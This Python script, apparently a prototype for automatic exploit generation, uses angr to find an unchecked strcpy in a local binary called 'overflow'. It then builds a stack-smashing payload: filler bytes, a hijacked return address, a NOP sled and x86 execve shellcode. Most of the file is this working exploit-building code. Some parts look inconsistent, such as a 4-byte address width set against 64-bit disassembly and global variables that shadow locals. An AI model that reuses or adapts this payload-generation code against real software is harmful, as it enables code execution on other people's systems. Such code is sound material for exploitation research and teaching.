import angr
import monkeyhex
import claripy
import archinfo
import sys

# todo: extend this to work with an arbitrary number of arguments

'''
set to work with 64-bit systems vs. 32
'''
system_addr_width = 4 # in bytes


def main():
    '''
     load the binary, don't load extra libs to save time/memory from state explosion
    '''
    project = angr.Project('overflow', load_options={'auto_load_libs':False})
    
    '''
     Add symbolic variable for the input buffer which we are solving for:
    '''
    sym_arg_size = 200  #max number of bytes we'll try to solve for
    
    '''
    create an initial state with a symbolic bit vector as argv1
    '''
    argv0 = project.filename
    argv1 = claripy.BVS("argv1",8*sym_arg_size)
    # argv1 = "BBBB"
    init_state = project.factory.entry_state(args=[argv0,argv1])

    '''
    create a simulationManager from the entry state
    ''' 
    sm = project.factory.simulation_manager(init_state)

    '''
    get the address of 'strcpy'
    todo: verify this is working by looking at the disassembly
    you should get 0x550
        0x00000000000006a8 <+30>:    callq  0x550 <strcpy@plt>
    '''
    # strcpy_addr = project.loader.find_symbol('strcpy')  # this did not work :(

    '''
     Set up CFG so we can grab function addresses from symbols.
     I set the fail_fast option to True to minimize how long
     this process takes.
    '''
    cfg = project.analyses.CFG(fail_fast=True)
    

    '''
     Just a helper function to grab function names from resolved symbols.
     This will not be so easy if the binary is stripped.  You will have to
     open the binary in a disassembler and find the addresses of the
     functions you are trying to find/avoid in your paths rather than using
     this helper function.

     Note: why does this still work even after stripping the binary?
    '''
    def getFuncAddress( funcName, plt=None ):
        found = [
            addr for addr,func in cfg.kb.functions.items()
            if funcName == func.name and (plt is None or func.is_plt == plt)
            ]
        if len( found ) > 0:
            print("Found "+funcName+"'s address at "+hex(found[0])+"!")
            return found[0]
        else:
            raise Exception("No address found for function : "+funcName)


    strcpy_addr = getFuncAddress('strcpy', plt=True)
    main_addr   = getFuncAddress('main')

    # exit_addr = getFuncAddress('exit', plt=True)
    # print(hex(exit_addr))

# stack start 0x7ffefeac
# jump target:
# <BV32 0x7ffefe80>
# diff = 60 in hex. 96 in dec. Same as linux binary woohoo!
    
    stack_start_addr = None
    stack_size_at_strcpy = None

    def check(state):
        global stack_start_addr, stack_size_at_strcpy
        if (state.ip.args[0] == main_addr):
            print("im in main!")
            stack_start_addr = state.callstack.current_stack_pointer
            print(hex(stack_start_addr))

        if (state.ip.args[0] == strcpy_addr):    # Ensure that we're at strcpy
            print(hex(state.callstack.current_stack_pointer))
            stack_size_at_strcpy = stack_start_addr - state.callstack.current_stack_pointer
            print("im in strcpy")
            print(hex(stack_size_at_strcpy))
            # assert(False)
            '''
             By looking at the disassembly, I've found that the pointer to the
             source buffer given to strcpy() is kept at ($esp + 8).  Here, we dereference
             the pointer in ($esp + 8) and grab a number of bytes equal to that of argv1 
             from that buffer.

            todo: make sure usage of rsi is consistent across architectures

            '''
            strCpySrcOff  = state.callstack.current_stack_pointer + (2 * system_addr_width)
            strCpySrcAddr = state.memory.load( strCpySrcOff, system_addr_width , endness=archinfo.Endness.LE)
            BV_strCpySrc = state.memory.load( strCpySrcAddr, sym_arg_size)

            '''
             Now we simply return True (found path) if we've found a path to strcpy
             where we control the source buffer, or False (keep looking for paths) if we
             don't control the source buffer
            '''
            isExploitable = BV_strCpySrc == argv1
            return state.solver.is_true(isExploitable)

        else:
            '''
             If we aren't in the strcpy function, we need to tell angr to keep looking
             for new paths.
            '''
            return False
    
    '''
    Get the first encountered state satisfying the check, if any
    '''
    sm = sm.explore(find=check)
    found = sm.found
    # return
    if len(found) == 0:    #   Make sure we found a path
        # Aww somehow we didn't find a path.  Time to work on that check() function!
        print("Couldn't find any paths which satisfied our conditions.")
    else:   
        print("Found a vulnerable strcpy: " + repr(found[0]))

    v_state = found[0]


    def getRetAddressAddr(state, increment):
        strcpy_frame = state.callstack.top
        caller_frame = state.callstack.pop()
        state.callstack.push(strcpy_frame)
        ret_addr = caller_frame.ret_addr
        addr = strcpy_frame.current_stack_pointer
        while True:
            data = state.memory.load( addr, system_addr_width, endness=archinfo.Endness.LE )
            if state.solver.is_true(data == ret_addr):
                return addr
            addr += increment


    def getMemContents(state, start, end):
        strcpy_frame = state.callstack.top
        mem_contents = []
        for addr in range( start, end ):
            data = state.memory.load( addr, 1, endness=archinfo.Endness.LE )
            mem_contents.append(data)
        return mem_contents
        

    def getRuntimeStackInfo(state):
        # change to increments of 1 to support non 8-bit aligned memory at the cost of performance
        increment = 1
        buff_offset  = state.callstack.current_stack_pointer + system_addr_width
        buff_addr = state.memory.load( buff_offset, system_addr_width , endness=archinfo.Endness.LE)
        # print(buff_addr)
        # BV_strCpySrc = state.memory.load( buff_addr, 5)
        # print(BV_strCpySrc)
        # assert(False)
        ret_addr  = getRetAddressAddr(state, increment) 
        # next line not needed?
        buff_addr_raw = state.solver.eval(buff_addr)
        data_inbetween = getMemContents(state, buff_addr_raw, ret_addr) # skip the buff_addr
        return buff_addr, ret_addr, data_inbetween


    print(v_state.memory.load(v_state.callstack.current_stack_pointer, 88))

    # print(hex(v_state.callstack.ret_addr))
    # print(hex(v_state.callstack.pop().ret_addr))
    # print(hex(v_state.callstack.pop().ret_addr))
    # return
    buff_addr, addr_ret_addr, data_inbetween = getRuntimeStackInfo(v_state)


    '''
    For debugging
    '''

    # dump buffer address and content
    print("buffer address: ")
    # 5 is hardcoded
    buff_data = v_state.memory.load(buff_addr, 5)
    print(hex(v_state.solver.eval(buff_addr)), buff_data, sep=" : ")

    # dump return address and its address
    print("address of return address: ")
    ret_addr = v_state.memory.load(addr_ret_addr, system_addr_width, endness=archinfo.Endness.LE)
    print(hex(addr_ret_addr), ret_addr, sep=" : ")

    # dump data stored in between buffer and ret addr
    print("stack data in between start of buffer and ret_addr:")
    print([hex(v_state.solver.eval(no)) for no in data_inbetween]) 

     # memory dump to help debug
    print(v_state.memory.load( v_state.callstack.current_stack_pointer, 64, endness=archinfo.Endness.LE))

    shellcode = bytearray()
    shellcode.extend(bytearray(b'\x90') *  100)  # nop sled
    shellcode.extend(bytearray(b'\x31\xc0\x31\xc9\x99\x50\x68\x2f\x76\x69\x6d\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\xb0\x0b\xcd\x80'))
    shellcode.extend(bytearray(b'\x90') *  8)  # nop sled 
    # shellcode.extend(bytearray(b'\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe'))
    # shellcode.extend(bytearray(b'\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe/bin/sh\xff'))

    generateExploitPredicate(v_state, buff_addr, addr_ret_addr, data_inbetween, shellcode, argv1)

    # print(str(v_state.solver.eval(argv1, cast_to=bytes)))
    print(v_state.solver.eval(argv1, cast_to=bytes))

    # 00fffeffffffff07


def get_byte(s, i):
    pos = s.size() // 8 - 1 - i
    return s[pos * 8 + 7 : pos * 8]


def generateExploitPredicate(state, buff_addr, addr_ret_addr, mem_contents, shell_code, argv1):
    '''
    stack restoration
    '''
    exploit_bytes =  mem_contents

    '''
    instead of restoring stack, try storing garbage
    '''
    garbage = [state.solver.BVV(65, 8)] * len(mem_contents) # stores list of "A"s in ASCII
    exploit_bytes = garbage

    offset = addr_ret_addr - buff_addr
    real_stack_start_addr = int(sys.argv[1], 16)
    print("real stack start addr: ")
    print(hex(real_stack_start_addr))
    jump_target = buff_addr + offset + system_addr_width    # hijack return address
    print("jump target:")
    print(jump_target)
    stack_size_above_jump_target = stack_start_addr - jump_target
    real_jump_target = real_stack_start_addr - stack_size_above_jump_target
    # assert(False)
    # store 8 bytes starting from rbp+8 into exploit_bytes
    for i in reversed(range(system_addr_width)):
        ret_addr_byte = get_byte(real_jump_target, i)
        exploit_bytes.append(ret_addr_byte)
    # store shellcode into exploit_bytes, byte by byte
    # shellcode_offset = offset + 8
    for i in range(len(shell_code)):
        exploit_bytes.append(shell_code[i])
    
    # add exploit predicate to state
    for i in range(len(exploit_bytes)):
        input_byte = get_byte(argv1, i)
        state.solver.add(input_byte == exploit_bytes[i])

    # exploit_bytes[offset] = jump_target   # hijack return address
    # print(hex(v_state.memory.load(addr_ret_addr, 8, endness=archinfo.Endness.LE)))
    return

if __name__ == '__main__':
    # main()
    print(repr(main()))

    # try 32 bit system


# Usefull adresses:
# function: 0x40054d
# main: 0x4005a1
    
# Dump of assembler code for function main:
#    0x00000000000006b0 <+0>:     push   %rbp
#    0x00000000000006b1 <+1>:     mov    %rsp,%rbp
#    0x00000000000006b4 <+4>:     sub    $0x20,%rsp
#    0x00000000000006b8 <+8>:     mov    %edi,-0x14(%rbp)
#    0x00000000000006bb <+11>:    mov    %rsi,-0x20(%rbp)
#    0x00000000000006bf <+15>:    movl   $0x0,-0x4(%rbp)
#    0x00000000000006c6 <+22>:    mov    -0x20(%rbp),%rax
#    0x00000000000006ca <+26>:    add    $0x8,%rax
#    0x00000000000006ce <+30>:    mov    (%rax),%rax
#    0x00000000000006d1 <+33>:    mov    %rax,%rdi
#    0x00000000000006d4 <+36>:    callq  0x68a <function>
#    0x00000000000006d9 <+41>:    movl   $0x1,-0x4(%rbp)
#    0x00000000000006e0 <+48>:    mov    -0x4(%rbp),%eax
#    0x00000000000006e3 <+51>:    mov    %eax,%esi
#    0x00000000000006e5 <+53>:    lea    0x98(%rip),%rdi        # 0x784
#    0x00000000000006ec <+60>:    mov    $0x0,%eax
#    0x00000000000006f1 <+65>:    callq  0x560 <printf@plt>
#    0x00000000000006f6 <+70>:    nop
#    0x00000000000006f7 <+71>:    leaveq 
#    0x00000000000006f8 <+72>:    retq   
# End of assembler dump.

# Dump of assembler code for function function:
#    0x000000000000068a <+0>:     push   %rbp
#    0x000000000000068b <+1>:     mov    %rsp,%rbp
#    0x000000000000068e <+4>:     sub    $0x20,%rsp
#    0x0000000000000692 <+8>:     mov    %rdi,-0x18(%rbp)
#    0x0000000000000696 <+12>:    movb   $0x0,-0x1(%rbp)
#    0x000000000000069a <+16>:    mov    -0x18(%rbp),%rdx
#    0x000000000000069e <+20>:    lea    -0x5(%rbp),%rax
#    0x00000000000006a2 <+24>:    mov    %rdx,%rsi
#    0x00000000000006a5 <+27>:    mov    %rax,%rdi
#    0x00000000000006a8 <+30>:    callq  0x550 <strcpy@plt>
#    0x00000000000006ad <+35>:    nop
#    0x00000000000006ae <+36>:    leaveq 
#    0x00000000000006af <+37>:    retq   
# End of assembler dump.